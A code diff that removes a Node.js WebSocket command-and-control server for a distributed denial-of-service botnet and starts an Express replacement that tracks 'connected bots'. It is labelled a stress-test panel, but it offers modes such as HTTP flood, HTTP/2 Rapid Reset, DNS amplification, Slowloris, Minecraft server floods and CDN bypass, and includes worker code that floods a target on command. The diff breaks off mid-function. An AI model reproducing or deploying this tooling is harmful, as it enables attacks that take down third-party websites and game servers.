@@ -1,1349 +1,451 @@
-const WebSocket = require('ws');
-const http = require('http');
+const express = require('express');
+const axios = require('axios');
 
-const PORT = process.env.PORT || 8080;
-const clients = new Map();
-let clientIdCounter = 0;
-let activeTest = null;
+const app = express();
+const port = process.env.PORT || 5552;
 
-// Admin HTML
-const adminHTML = `<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Stress Test Control Panel</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #0f0f23;
-            color: #e0e0e0;
-            padding: 20px;
-        }
-        .container { max-width: 1200px; margin: 0 auto; }
-        h1 {
-            color: #00ff41;
-            margin-bottom: 30px;
-            text-shadow: 0 0 10px #00ff41;
-        }
-        .status-bar {
-            background: #1a1a2e;
-            padding: 20px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            border-left: 4px solid #00ff41;
-        }
-        .status-item {
-            display: inline-block;
-            margin-right: 30px;
-            font-size: 14px;
-        }
-        .status-label { color: #888; }
-        .status-value { 
-            color: #00ff41;
-            font-weight: bold;
-            font-size: 18px;
-        }
-        .config-panel {
-            background: #1a1a2e;
-            padding: 25px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-        }
-        .form-group {
-            margin-bottom: 15px;
-        }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            color: #aaa;
-            font-size: 14px;
-        }
-        input, select {
-            width: 100%;
-            padding: 10px;
-            background: #0f0f23;
-            border: 1px solid #333;
-            border-radius: 4px;
-            color: #e0e0e0;
-            font-size: 14px;
-        }
-        input:focus, select:focus {
-            outline: none;
-            border-color: #00ff41;
-        }
-        .btn {
-            padding: 12px 30px;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            cursor: pointer;
-            margin-right: 10px;
-            transition: all 0.3s;
-        }
-        .btn-start {
-            background: #00ff41;
-            color: #0f0f23;
-            font-weight: bold;
-        }
-        .btn-start:hover { background: #00cc33; }
-        .btn-stop {
-            background: #ff4444;
-            color: white;
-        }
-        .btn-stop:hover { background: #cc0000; }
-        .btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-        .workers-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
-            gap: 15px;
-            margin-top: 20px;
-        }
-        .worker-card {
-            background: #1a1a2e;
-            padding: 15px;
-            border-radius: 8px;
-            border-left: 4px solid #555;
-        }
-        .worker-card.active { border-left-color: #00ff41; }
-        .worker-id {
-            font-weight: bold;
-            color: #00ff41;
-            margin-bottom: 10px;
-        }
-        .worker-stat {
-            font-size: 12px;
-            margin: 5px 0;
-            color: #aaa;
-            word-break: break-all;
-        }
-        .worker-stat span {
-            color: #fff;
-            font-weight: bold;
-        }
-        .worker-stat.highlight {
-            color: #00ff41;
-            font-weight: bold;
-        }
-        .total-stats {
-            background: #16213e;
-            padding: 20px;
-            border-radius: 8px;
-            margin: 20px 0;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 20px;
-        }
-        .stat-box {
-            text-align: center;
-        }
-        .stat-label {
-            color: #888;
-            font-size: 12px;
-            text-transform: uppercase;
-        }
-        .stat-value {
-            font-size: 32px;
-            font-weight: bold;
-            color: #00ff41;
-            margin-top: 5px;
-        }
-        .connection-status {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            padding: 10px 20px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: bold;
-        }
-        .connection-status.connected {
-            background: #00ff41;
-            color: #0f0f23;
-        }
-        .connection-status.disconnected {
-            background: #ff4444;
-            color: white;
-        }
-        .summary-modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            z-index: 9999;
-            align-items: center;
-            justify-content: center;
-        }
-        .summary-modal.show {
-            display: flex;
-        }
-        .summary-content {
-            background: #1a1a2e;
-            border: 2px solid #00ff41;
-            border-radius: 10px;
-            padding: 30px;
-            max-width: 500px;
-            width: 90%;
-            box-shadow: 0 0 30px rgba(0, 255, 65, 0.5);
-        }
-        .summary-title {
-            color: #00ff41;
-            font-size: 24px;
-            font-weight: bold;
-            text-align: center;
-            margin-bottom: 20px;
-            text-shadow: 0 0 10px #00ff41;
-        }
-        .summary-stat {
-            display: flex;
-            justify-content: space-between;
-            padding: 15px;
-            border-bottom: 1px solid #333;
-            font-size: 16px;
-        }
-        .summary-stat:last-child {
-            border-bottom: none;
-        }
-        .summary-label {
-            color: #aaa;
-        }
-        .summary-value {
-            color: #00ff41;
-            font-weight: bold;
-            font-size: 20px;
-        }
-        .summary-close {
-            margin-top: 20px;
-            width: 100%;
-            padding: 12px;
-            background: #00ff41;
-            color: #0f0f23;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-        .summary-close:hover {
-            background: #00cc33;
-        }
-        .worker-notification {
-            position: fixed;
-            top: 80px;
-            right: 20px;
-            padding: 15px 25px;
-            background: #00ff41;
-            color: #0f0f23;
-            border-radius: 8px;
-            font-weight: bold;
-            animation: slideIn 0.3s ease-out;
-            z-index: 1000;
-        }
-        @keyframes slideIn {
-            from {
-                transform: translateX(400px);
-                opacity: 0;
-            }
-            to {
-                transform: translateX(0);
-                opacity: 1;
-            }
-        }
-    </style>
-</head>
-<body>
-    <div class="connection-status" id="connStatus">DISCONNECTED</div>
-    
-    <!-- Attack Summary Modal -->
-    <div class="summary-modal" id="summaryModal">
-        <div class="summary-content">
-            <div class="summary-title">⚡ ATTACK SUMMARY</div>
-            <div class="summary-stat">
-                <span class="summary-label">Total Requests Sent:</span>
-                <span class="summary-value" id="sumTotalSent">0</span>
-            </div>
-            <div class="summary-stat">
-                <span class="summary-label">Successful:</span>
-                <span class="summary-value" id="sumSuccess" style="color: #00ff41;">0</span>
-            </div>
-            <div class="summary-stat">
-                <span class="summary-label">Failed:</span>
-                <span class="summary-value" id="sumFailed" style="color: #ff4444;">0</span>
-            </div>
-            <div class="summary-stat">
-                <span class="summary-label">Success Rate:</span>
-                <span class="summary-value" id="sumRate">0%</span>
-            </div>
-            <div class="summary-stat">
-                <span class="summary-label">Workers Used:</span>
-                <span class="summary-value" id="sumWorkers">0</span>
-            </div>
-            <button class="summary-close" onclick="closeSummary()">CLOSE</button>
-        </div>
-    </div>
-    
-    <div class="container">
-        <h1>⚡ Stress Test Control Panel</h1>
-        
-        <div class="status-bar">
-            <div class="status-item">
-                <span class="status-label">Workers:</span>
-                <span class="status-value" id="workerCount">0</span>
-            </div>
-            <div class="status-item">
-                <span class="status-label">Status:</span>
-                <span class="status-value" id="testStatus">IDLE</span>
-            </div>
-        </div>
+// Store connected bots
+let connectedBots = [];
 
-        <div class="config-panel">
-            <h2 style="margin-bottom: 20px; color: #00ff41;">Test Configuration</h2>
-            <div class="form-group">
-                <label>Target URL</label>
-                <input type="text" id="targetUrl" placeholder="https://example.com" value="https://httpbin.org/get">
-            </div>
-            <div class="form-group">
-                <label>Request Method</label>
-                <select id="method">
-                    <option value="GET">GET</option>
-                    <option value="POST">POST</option>
-                    <option value="PUT">PUT</option>
-                    <option value="DELETE">DELETE</option>
-                    <option value="HEAD">HEAD</option>
-                    <option value="OPTIONS">OPTIONS</option>
-                    <option value="PATCH">PATCH</option>
-                </select>
-            </div>
-            <div class="form-group">
-                <label>Attack Mode</label>
-                <select id="attackMode">
-                    <option value="standard">Standard (HTTP Flood)</option>
-                    <option value="http2-rapid-reset">HTTP/2 Rapid Reset (CVE-2023-44487)</option>
-                    <option value="dns-amplification">DNS Amplification (UDP Flood)</option>
-                    <option value="slowloris">Slowloris (Slow Headers)</option>
-                    <option value="slow-post">Slow POST (R.U.D.Y)</option>
-                    <option value="xmlrpc">XML-RPC Flood</option>
-                    <option value="api-abuse">API Abuse</option>
-                    <option value="cache-bypass">Advanced Cache Bypass</option>
-                    <option value="minecraft-handshake">Minecraft Handshake Flood</option>
-                    <option value="minecraft-ping">Minecraft Ping Flood</option>
-                    <option value="minecraft-login">Minecraft Login Spam</option>
-                    <option value="minecraft-join">Minecraft Join Flood</option>
-                </select>
-            </div>
-            <div class="form-group" id="minecraftPortGroup" style="display: none;">
-                <label>Minecraft Server Port</label>
-                <input type="number" id="minecraftPort" value="25565" min="1" max="65535">
-            </div>
-            <div class="form-group">
-                <label>Attack Duration (seconds)</label>
-                <input type="number" id="duration" value="30" min="1">
-            </div>
-            <div class="form-group">
-                <label>Threads per Worker</label>
-                <input type="number" id="threads" value="10" min="1" max="1000">
-            </div>
-            <div class="form-group">
-                <label>Delay between requests (ms)</label>
-                <input type="number" id="delay" value="1" min="0">
-            </div>
-            
-            <h3 style="margin: 25px 0 15px; color: #00ff41; font-size: 16px;">🔥 Advanced Bypass Methods (High D-Stat)</h3>
-            
-            <div class="form-group" style="display: flex; align-items: center; margin-bottom: 10px;">
-                <input type="checkbox" id="bypassDNS" style="width: auto; margin-right: 10px;">
-                <label style="margin: 0; cursor: pointer;" for="bypassDNS">DNS Bypass (Pre-resolve IPs)</label>
-            </div>
-            
-            <div class="form-group" style="display: flex; align-items: center; margin-bottom: 10px;">
-                <input type="checkbox" id="randomHeaders" style="width: auto; margin-right: 10px;">
-                <label style="margin: 0; cursor: pointer;" for="randomHeaders">Random Headers (Anti-fingerprint)</label>
-            </div>
-            
-            <div class="form-group" style="display: flex; align-items: center; margin-bottom: 10px;">
-                <input type="checkbox" id="randomReferer" style="width: auto; margin-right: 10px;">
-                <label style="margin: 0; cursor: pointer;" for="randomReferer">Random Referer (Spoof source)</label>
-            </div>
-            
-            <div class="form-group" style="display: flex; align-items: center; margin-bottom: 10px;">
-                <input type="checkbox" id="cacheBust" style="width: auto; margin-right: 10px;">
-                <label style="margin: 0; cursor: pointer;" for="cacheBust">Cache Busting (Bypass CDN)</label>
-            </div>
-            
-            <div class="form-group" style="display: flex; align-items: center; margin-bottom: 10px;">
-                <input type="checkbox" id="randomParams" style="width: auto; margin-right: 10px;">
-                <label style="margin: 0; cursor: pointer;" for="randomParams">Random Query Params</label>
-            </div>
-            
-            <div class="form-group" style="display: flex; align-items: center; margin-bottom: 10px;">
-                <input type="checkbox" id="cookieFlood" style="width: auto; margin-right: 10px;">
-                <label style="margin: 0; cursor: pointer;" for="cookieFlood">Cookie Flooding</label>
-            </div>
-            
-            <div class="form-group" style="display: flex; align-items: center; margin-bottom: 10px;">
-                <input type="checkbox" id="rangeHeader" style="width: auto; margin-right: 10px;">
-                <label style="margin: 0; cursor: pointer;" for="rangeHeader">Range Header Attack</label>
-            </div>
-            
-            <div class="form-group" style="display: flex; align-items: center; margin-bottom: 10px;">
-                <input type="checkbox" id="connectionExhaustion" style="width: auto; margin-right: 10px;">
-                <label style="margin: 0; cursor: pointer;" for="connectionExhaustion">🔥 Connection Exhaustion (High D-Stat)</label>
-            </div>
-            
-            <div class="form-group" style="display: flex; align-items: center; margin-bottom: 10px;">
-                <input type="checkbox" id="slowRead" style="width: auto; margin-right: 10px;">
-                <label style="margin: 0; cursor: pointer;" for="slowRead">🔥 Slow Read Attack (Server Hold)</label>
-            </div>
-            
-            <div class="form-group" style="display: flex; align-items: center; margin-bottom: 10px;">
-                <input type="checkbox" id="randomPath" style="width: auto; margin-right: 10px;">
-                <label style="margin: 0; cursor: pointer;" for="randomPath">🔥 Random Path Flood (404 Spam)</label>
-            </div>
-            
-            <div class="form-group" style="display: flex; align-items: center; margin-bottom: 10px;">
-                <input type="checkbox" id="postDataFlood" style="width: auto; margin-right: 10px;">
-                <label style="margin: 0; cursor: pointer;" for="postDataFlood">🔥 POST Data Flood (Upload Spam)</label>
-            </div>
-            
-            <div class="form-group" style="display: flex; align-items: center; margin-bottom: 10px;">
-                <input type="checkbox" id="socketReuse" style="width: auto; margin-right: 10px;">
-                <label style="margin: 0; cursor: pointer;" for="socketReuse">🔥 Socket Reuse Attack (Max Connections)</label>
-            </div>
-            
-            <div class="form-group" style="display: flex; align-items: center; margin-bottom: 10px;">
-                <input type="checkbox" id="useProxy" style="width: auto; margin-right: 10px;">
-                <label style="margin: 0; cursor: pointer;" for="useProxy">Use Proxies (from proxies.txt)</label>
-            </div>
-            
-            <div class="form-group" style="display: flex; align-items: center; margin-bottom: 10px;">
-                <input type="checkbox" id="rotateUserAgent" style="width: auto; margin-right: 10px;">
-                <label style="margin: 0; cursor: pointer;" for="rotateUserAgent">Rotate User-Agent (from headers.txt)</label>
-            </div>
-            
-            <div class="form-group">
-                <label>POST Data (optional, for POST/PUT requests)</label>
-                <input type="text" id="postData" placeholder='{"key": "value"}' value="">
-            </div>
-            
-            <div style="margin-top: 20px;">
-                <button class="btn btn-start" id="startBtn" onclick="startTest()">START TEST</button>
-                <button class="btn btn-stop" id="stopBtn" onclick="stopTest()" disabled>STOP TEST</button>
-            </div>
-        </div>
-
-        <div class="total-stats">
-            <div class="stat-box">
-                <div class="stat-label">Total Sent</div>
-                <div class="stat-value" id="totalSent">0</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-label">Success</div>
-                <div class="stat-value" id="totalSuccess" style="color: #00ff41;">0</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-label">Failed</div>
-                <div class="stat-value" id="totalFailed" style="color: #ff4444;">0</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-label">Success Rate</div>
-                <div class="stat-value" id="successRate">0%</div>
-            </div>
-        </div>
-
-        <h2 style="margin: 30px 0 15px; color: #00ff41;">Connected Workers</h2>
-        <div class="workers-grid" id="workersGrid"></div>
-    </div>
-
-    <script>
-        let ws;
-        let workers = [];
-
-        function connect() {
-            // Use correct WebSocket protocol based on page protocol
-            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-            const wsUrl = protocol + '//' + window.location.host;
-            
-            console.log('Connecting to:', wsUrl);
-            ws = new WebSocket(wsUrl);
-            
-            ws.onopen = () => {
-                console.log('Connected to server');
-                document.getElementById('connStatus').textContent = 'CONNECTED';
-                document.getElementById('connStatus').className = 'connection-status connected';
-                ws.send(JSON.stringify({ type: 'identify', role: 'admin' }));
-                // Request status immediately and keep polling
-                requestStatus();
-            };
-
-            ws.onmessage = (event) => {
-                const data = JSON.parse(event.data);
-                console.log('Received message:', data.type, data);
-                handleMessage(data);
-            };
-
-            ws.onclose = () => {
-                console.log('Disconnected from server');
-                document.getElementById('connStatus').textContent = 'DISCONNECTED';
-                document.getElementById('connStatus').className = 'connection-status disconnected';
-                setTimeout(connect, 2000);
-            };
-        }
-
-        function handleMessage(data) {
-            console.log('Handling message type:', data.type);
-            
-            switch(data.type) {
-                case 'status':
-                    console.log('Status received - workers:', data.workers);
-                    workers = data.workers || [];
-                    updateWorkersDisplay();
-                    // Update worker count immediately
-                    document.getElementById('workerCount').textContent = workers.length;
-                    break;
-                case 'worker_stats':
-                    updateWorkerStats(data.workerId, data.stats);
-                    // Update worker info if provided
-                    const worker = workers.find(w => w.id === data.workerId);
-                    if (worker) {
-                        if (data.currentUA) worker.currentUA = data.currentUA;
-                        if (data.currentProxy) worker.currentProxy = data.currentProxy;
-                        if (data.uaCount !== undefined) worker.uaCount = data.uaCount;
-                        if (data.proxyCount !== undefined) worker.proxyCount = data.proxyCount;
-                        updateWorkersDisplay();
-                    }
-                    break;
-                case 'test_started':
-                    document.getElementById('testStatus').textContent = 'RUNNING';
-                    document.getElementById('startBtn').disabled = true;
-                    document.getElementById('stopBtn').disabled = false;
-                    break;
-                case 'test_stopped':
-                    document.getElementById('testStatus').textContent = 'IDLE';
-                    document.getElementById('startBtn').disabled = false;
-                    document.getElementById('stopBtn').disabled = true;
-                    // Update final stats if provided
-                    if (data.finalStats) {
-                        data.finalStats.forEach(w => {
-                            updateWorkerStats(w.id, w.stats);
-                        });
-                    }
-                    // Show summary report
-                    if (data.summary) {
-                        showSummary(data.summary);
-                    }
-                    break;
-                case 'client_disconnected':
-                    // Update final stats before removing worker
-                    if (data.finalStats) {
-                        updateWorkerStats(data.finalStats.id, data.finalStats.stats);
-                    }
-                    setTimeout(() => {
-                        workers = workers.filter(w => w.id !== data.clientId);
-                        updateWorkersDisplay();
-                    }, 2000); // Keep stats visible for 2 seconds
-                    break;
-                case 'workers_cleaned':
-                    requestStatus(); // Refresh worker list
-                    break;
-                case 'worker_connected':
-                    // New worker connected - refresh list immediately
-                    showNotification('⚡ New worker connected!');
-                    requestStatus();
-                    break;
-                case 'error':
-                    alert(data.message);
-                    break;
-            }
-        }
-
-        function updateWorkerStats(workerId, stats) {
-            const worker = workers.find(w => w.id === workerId);
-            if (worker) {
-                worker.stats = stats;
-                updateWorkersDisplay();
-            }
-        }
-
-        function updateWorkersDisplay() {
-            const grid = document.getElementById('workersGrid');
-            const workerCount = workers.length;
-            document.getElementById('workerCount').textContent = workerCount;
-            
-            console.log('Updating display with', workerCount, 'workers:', workers);
-            
-            if (workerCount === 0) {
-                grid.innerHTML = '<div style="grid-column: 1/-1; text-align: center; color: #666; padding: 40px;">No workers connected. Open /worker page or run node client.js</div>';
-                return;
-            }
-            
-            let totalSent = 0, totalSuccess = 0, totalFailed = 0;
-            
-            grid.innerHTML = workers.map(w => {
-                totalSent += w.stats.sent || 0;
-                totalSuccess += w.stats.success || 0;
-                totalFailed += w.stats.failed || 0;
-                
-                return \`
-                    <div class="worker-card \${w.status === 'active' ? 'active' : ''}">
-                        <div class="worker-id">Worker #\${w.id}</div>
-                        <div class="worker-stat">Status: <span>\${w.status.toUpperCase()}</span></div>
-                        <div class="worker-stat">Threads: <span>\${config && config.threads || '-'}</span></div>
-                        <div class="worker-stat">Sent: <span>\${w.stats.sent || 0}</span></div>
-                        <div class="worker-stat">Success: <span>\${w.stats.success || 0}</span></div>
-                        <div class="worker-stat">Failed: <span>\${w.stats.failed || 0}</span></div>
-                    </div>
-                \`;
-            }).join('');
-            
-            document.getElementById('totalSent').textContent = totalSent;
-            document.getElementById('totalSuccess').textContent = totalSuccess;
-            document.getElementById('totalFailed').textContent = totalFailed;
-            
-            const rate = totalSent > 0 ? ((totalSuccess / totalSent) * 100).toFixed(1) : 0;
-            document.getElementById('successRate').textContent = rate + '%';
-        }
-
-        function startTest() {
-            const attackMode = document.getElementById('attackMode').value;
-            const isMinecraft = attackMode.startsWith('minecraft-');
-            
-            const config = {
-                target: document.getElementById('targetUrl').value,
-                method: document.getElementById('method').value,
-                attackMode: attackMode,
-                duration: parseInt(document.getElementById('duration').value),
-                threads: parseInt(document.getElementById('threads').value),
-                delay: parseInt(document.getElementById('delay').value),
-                bypassDNS: document.getElementById('bypassDNS').checked,
-                randomHeaders: document.getElementById('randomHeaders').checked,
-                randomReferer: document.getElementById('randomReferer').checked,
-                cacheBust: document.getElementById('cacheBust').checked,
-                randomParams: document.getElementById('randomParams').checked,
-                cookieFlood: document.getElementById('cookieFlood').checked,
-                rangeHeader: document.getElementById('rangeHeader').checked,
-                connectionExhaustion: document.getElementById('connectionExhaustion').checked,
-                slowRead: document.getElementById('slowRead').checked,
-                randomPath: document.getElementById('randomPath').checked,
-                postDataFlood: document.getElementById('postDataFlood').checked,
-                socketReuse: document.getElementById('socketReuse').checked,
-                useProxy: document.getElementById('useProxy').checked,
-                rotateUserAgent: document.getElementById('rotateUserAgent').checked,
-                postData: document.getElementById('postData').value,
-                minecraftPort: isMinecraft ? parseInt(document.getElementById('minecraftPort').value) : 25565
-            };
-            
-            if (!config.target) {
-                alert('Please enter a target URL or IP address');
-                return;
-            }
-            
-            if (config.duration < 1) {
-                alert('Duration must be at least 1 second');
-                return;
-            }
-            
-            if (config.threads < 1 || config.threads > 1000) {
-                alert('Threads must be between 1 and 1000');
-                return;
-            }
-            
-            ws.send(JSON.stringify({ type: 'start_test', config }));
-        }
-
-        // Show/hide Minecraft port field based on attack mode
-        document.getElementById('attackMode').addEventListener('change', function() {
-            const isMinecraft = this.value.startsWith('minecraft-');
-            document.getElementById('minecraftPortGroup').style.display = isMinecraft ? 'block' : 'none';
-            
-            if (isMinecraft) {
-                document.getElementById('targetUrl').placeholder = 'mc.hypixel.net or 192.168.1.1';
-            } else {
-                document.getElementById('targetUrl').placeholder = 'https://example.com';
-            }
-        });
-
-        function stopTest() {
-            ws.send(JSON.stringify({ type: 'stop_test' }));
-        }
-
-        function requestStatus() {
-            if (ws && ws.readyState === WebSocket.OPEN) {
-                ws.send(JSON.stringify({ type: 'get_status' }));
-            } else if (!ws || ws.readyState === WebSocket.CLOSED) {
-                // Try to reconnect if disconnected
-                connect();
-            }
-        }
-
-        function showNotification(message) {
-            const notif = document.createElement('div');
-            notif.className = 'worker-notification';
-            notif.textContent = message;
-            document.body.appendChild(notif);
-            
-            setTimeout(() => {
-                notif.style.opacity = '0';
-                notif.style.transform = 'translateX(400px)';
-                setTimeout(() => notif.remove(), 300);
-            }, 3000);
-        }
-
-        function showSummary(summary) {
-            document.getElementById('sumTotalSent').textContent = summary.totalSent;
-            document.getElementById('sumSuccess').textContent = summary.totalSuccess;
-            document.getElementById('sumFailed').textContent = summary.totalFailed;
-            document.getElementById('sumRate').textContent = summary.successRate + '%';
-            document.getElementById('sumWorkers').textContent = summary.workersUsed;
-            document.getElementById('summaryModal').className = 'summary-modal show';
-        }
-
-        function closeSummary() {
-            document.getElementById('summaryModal').className = 'summary-modal';
-        }
-
-        // Poll for status every 2 seconds
-        setInterval(() => {
-            requestStatus();
-        }, 2000);
-        
-        connect();
-    </script>
-</body>
-</html>`;
-
-// Worker Client HTML
-const workerHTML = `<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Stress Test Worker</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Courier New', monospace;
-            background: #000;
-            color: #00ff41;
-            padding: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-        .container {
-            max-width: 600px;
-            width: 100%;
-            background: #0a0a0a;
-            border: 2px solid #00ff41;
-            border-radius: 10px;
-            padding: 30px;
-            box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
-        }
-        h1 {
-            text-align: center;
-            margin-bottom: 20px;
-            font-size: 24px;
-            text-shadow: 0 0 10px #00ff41;
-        }
-        .status {
-            text-align: center;
-            margin: 20px 0;
-            font-size: 18px;
-            padding: 15px;
-            background: #111;
-            border-radius: 5px;
-        }
-        .status.idle { color: #888; }
-        .status.active { 
-            color: #00ff41;
-            animation: pulse 1.5s infinite;
-        }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.6; }
-        }
-        .stats {
-            margin-top: 30px;
-        }
-        .stat-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 10px;
-            border-bottom: 1px solid #222;
-        }
-        .stat-label { color: #888; }
-        .stat-value { 
-            color: #00ff41;
-            font-weight: bold;
-        }
-        .log {
-            margin-top: 30px;
-            background: #111;
-            border-radius: 5px;
-            padding: 15px;
-            max-height: 200px;
-            overflow-y: auto;
-            font-size: 12px;
-        }
-        .log-entry {
-            margin: 5px 0;
-            opacity: 0.8;
-        }
-        .connection-badge {
-            text-align: center;
-            padding: 10px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-        }
-        .connection-badge.connected {
-            background: #003311;
-            color: #00ff41;
-        }
-        .connection-badge.disconnected {
-            background: #330000;
-            color: #ff4444;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>⚡ WORKER NODE ⚡</h1>
-        
-        <div class="connection-badge" id="connBadge">
-            <span id="connText">DISCONNECTED</span>
-        </div>
-        
-        <div class="status idle" id="status">IDLE - Waiting for commands...</div>
-        
-        <div class="stats">
-            <div class="stat-row">
-                <span class="stat-label">Requests Sent:</span>
-                <span class="stat-value" id="sentCount">0</span>
-            </div>
-            <div class="stat-row">
-                <span class="stat-label">Success:</span>
-                <span class="stat-value" id="successCount">0</span>
-            </div>
-            <div class="stat-row">
-                <span class="stat-label">Failed:</span>
-                <span class="stat-value" id="failedCount">0</span>
-            </div>
-            <div class="stat-row">
-                <span class="stat-label">Target:</span>
-                <span class="stat-value" id="target">-</span>
-            </div>
-        </div>
-        
-        <div class="log" id="log"></div>
-    </div>
-
-    <script>
-        let ws;
-        let isRunning = false;
-        let stats = { sent: 0, success: 0, failed: 0 };
-        let currentConfig = null;
-
-        function connect() {
-            ws = new WebSocket('ws://' + window.location.host);
-            
-            ws.onopen = () => {
-                log('Connected to command server');
-                updateConnectionStatus(true);
-                ws.send(JSON.stringify({ type: 'identify', role: 'worker' }));
-            };
-
-            ws.onmessage = async (event) => {
-                const data = JSON.parse(event.data);
-                
-                if (data.type === 'ready') {
-                    log('Worker ready - awaiting orders');
-                }
-                
-                if (data.type === 'start') {
-                    log('Received attack orders');
-                    currentConfig = data.config;
-                    document.getElementById('target').textContent = currentConfig.target;
-                    startAttack(currentConfig);
-                }
-                
-                if (data.type === 'stop') {
-                    log('Stop command received');
-                    stopAttack();
-                }
-            };
-
-            ws.onclose = () => {
-                log('Disconnected from server');
-                updateConnectionStatus(false);
-                stopAttack();
-                setTimeout(connect, 2000);
-            };
-        }
-
-        async function startAttack(config) {
-            isRunning = true;
-            stats = { sent: 0, success: 0, failed: 0 };
-            updateStatus('active', 'ATTACKING ' + config.target);
-            
-            log(\`Starting attack: \${config.duration}s duration with \${config.threads} threads\`);
-            
-            const endTime = Date.now() + (config.duration * 1000);
-            const threads = [];
-            
-            // Create worker threads
-            for (let i = 0; i < config.threads; i++) {
-                threads.push(attackThread(config, endTime));
-            }
-            
-            const statsInterval = setInterval(() => {
-                if (isRunning) {
-                    updateStatsDisplay();
-                    reportStats();
-                }
-            }, 500);
-            
-            await Promise.all(threads);
-            clearInterval(statsInterval);
-            
-            reportStats(); // Send final stats
-            updateStatsDisplay();
-            
-            if (isRunning) {
-                log('Attack completed');
-                updateStatus('idle', 'IDLE - Attack completed');
-                isRunning = false;
-            }
-        }
-
-        async function attackThread(config, endTime) {
-            while (isRunning && Date.now() < endTime) {
-                await sendRequest(config);
-                if (config.delay > 0) {
-                    await sleep(config.delay);
-                }
-            }
-        }
-
-        async function sendRequest(config) {
-            stats.sent++;
-            updateStatsDisplay();
-            reportStats();
-            
-            try {
-                const response = await fetch(config.target, {
-                    method: config.method,
-                    mode: 'no-cors'
-                });
-                
-                stats.success++;
-                updateStatsDisplay();
-                
-            } catch (error) {
-                stats.failed++;
-                updateStatsDisplay();
-            }
-        }
-
-        function stopAttack() {
-            isRunning = false;
-            updateStatus('idle', 'IDLE - Stopped');
-        }
-
-        function reportStats() {
-            if (ws && ws.readyState === WebSocket.OPEN) {
-                ws.send(JSON.stringify({
-                    type: 'stats',
-                    stats: stats
-                }));
-            }
-        }
-
-        function updateStatsDisplay() {
-            document.getElementById('sentCount').textContent = stats.sent;
-            document.getElementById('successCount').textContent = stats.success;
-            document.getElementById('failedCount').textContent = stats.failed;
-        }
-
-        function updateStatus(className, text) {
-            const el = document.getElementById('status');
-            el.className = 'status ' + className;
-            el.textContent = text;
-        }
-
-        function updateConnectionStatus(connected) {
-            const badge = document.getElementById('connBadge');
-            const text = document.getElementById('connText');
-            
-            if (connected) {
-                badge.className = 'connection-badge connected';
-                text.textContent = 'CONNECTED';
-            } else {
-                badge.className = 'connection-badge disconnected';
-                text.textContent = 'DISCONNECTED';
-            }
-        }
-
-        function log(message) {
-            const logEl = document.getElementById('log');
-            const time = new Date().toLocaleTimeString();
-            const entry = document.createElement('div');
-            entry.className = 'log-entry';
-            entry.textContent = \`[\${time}] \${message}\`;
-            logEl.appendChild(entry);
-            logEl.scrollTop = logEl.scrollHeight;
-            
-            if (logEl.children.length > 50) {
-                logEl.removeChild(logEl.firstChild);
-            }
-        }
-
-        function sleep(ms) {
-            return new Promise(resolve => setTimeout(resolve, ms));
-        }
-
-        connect();
-    </script>
-</body>
-</html>`;
-
-// HTTP Server
-const server = http.createServer((req, res) => {
-  if (req.url === '/' || req.url === '/admin') {
-    res.writeHead(200, { 'Content-Type': 'text/html' });
-    res.end(adminHTML);
-  } else if (req.url === '/client' || req.url === '/worker') {
-    res.writeHead(200, { 'Content-Type': 'text/html' });
-    res.end(workerHTML);
-  } else {
-    res.writeHead(404);
-    res.end('Not found');
-  }
-});
-
-// WebSocket Server
-const wss = new WebSocket.Server({ 
-  server,
-  clientTracking: true,
-  perMessageDeflate: false,
-  // Add these options for Render compatibility
-  verifyClient: (info) => true,
-  handleProtocols: (protocols, request) => protocols[0]
-});
-
-// Heartbeat to keep connections alive
-function heartbeat() {
-  this.isAlive = true;
-}
-
-// Check for dead connections every 30 seconds
-const heartbeatInterval = setInterval(() => {
-  wss.clients.forEach((ws) => {
-    if (ws.isAlive === false) {
-      console.log('[x] Terminating dead connection');
-      return ws.terminate();
-    }
-    ws.isAlive = false;
-    try {
-      ws.ping();
-    } catch (e) {
-      console.error('[!] Ping error:', e.message);
-    }
-  });
-}, 30000);
-
-wss.on('close', () => {
-  clearInterval(heartbeatInterval);
-});
-
-// Cleanup dead workers every 5 seconds
-setInterval(() => {
-  let removedCount = 0;
-  clients.forEach((client, id) => {
-    if (client.ws.readyState === WebSocket.CLOSED || client.ws.readyState === WebSocket.CLOSING) {
-      clients.delete(id);
-      removedCount++;
-      console.log(`[x] Removed dead client #${id}`);
-    }
-  });
-  
-  if (removedCount > 0) {
-    broadcastToAdmins({ 
-      type: 'workers_cleaned',
-      removed: removedCount 
-    });
-  }
-}, 5000);
-
-wss.on('connection', (ws) => {
-  ws.isAlive = true;
-  ws.on('pong', heartbeat);
-  
